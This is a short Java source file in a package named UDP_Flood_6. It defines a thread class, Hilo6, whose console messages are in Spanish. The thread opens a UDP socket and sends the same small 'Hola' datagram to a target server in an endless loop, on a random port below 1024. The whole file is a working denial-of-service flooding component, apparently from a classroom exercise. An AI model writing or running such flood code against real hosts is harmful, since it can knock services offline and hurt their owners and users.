package UDP_Flood_6;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

public class Hilo6 extends Thread{
    private Random random = new Random();
    private InetAddress servidor;
    private DatagramSocket socket;
    private DatagramPacket paquete;
    private byte[] buf;

    public Hilo6(InetAddress servidor) {
        this.servidor = servidor;
    }
    
    @Override
    public void run(){
        try {
            socket = new DatagramSocket();
            System.out.println("Conectado al servidor");
            buf = "Hola".getBytes();
            System.out.println("buf creado");
            paquete = new DatagramPacket(buf, buf.length, servidor, random.nextInt(1024));
            System.out.println("Creada salida de datos");
            while(true){
                socket.send(paquete);
                System.out.println("Mensaje escrito");
            }
        } catch (Exception ex) {
            try {
                socket.close();
            } catch (Exception ex1) {
                System.out.println("Error al cerrar la conexión");
            }
            System.out.println(ex.getMessage());
            System.out.println("Cerrando conexión");
        }
    }
}
